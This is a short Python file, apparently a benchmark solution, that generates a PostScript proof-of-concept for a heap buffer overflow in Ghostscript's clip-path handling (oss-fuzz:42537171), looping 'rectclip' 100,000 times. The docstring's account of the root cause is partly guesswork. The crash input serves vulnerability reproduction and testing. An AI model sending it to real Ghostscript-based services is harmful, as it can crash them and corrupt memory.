import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (oss-fuzz:42537171) is a Heap Buffer Overflow in Ghostscript
        caused by unchecked nesting depth when pushing clip marks in the command list
        logic (gx_clip_path_push_mark).
        
        We generate a PostScript file that executes a loop of 'rectclip' operations.
        Each 'rectclip' increases the complexity/depth of the clip path. A sufficient
        number of iterations (e.g., 100,000) will overflow the heap buffer if the
        depth check is missing.
        
        The code is wrapped in a 'stopped' context. In the fixed version, this likely
        triggers a 'limitcheck' or similar error which is caught, resulting in a 
        clean exit (code 0). In the vulnerable version, the heap corruption causes 
        a crash (ASAN error) before the error can be caught.
        """
        return (
            b"%!PS\n"
            b"{\n"
            b"  0 1 100000 {\n"
            b"    0 0 100 100 rectclip\n"
            b"  } for\n"
            b"} stopped pop\n"
            b"showpage\n"
        )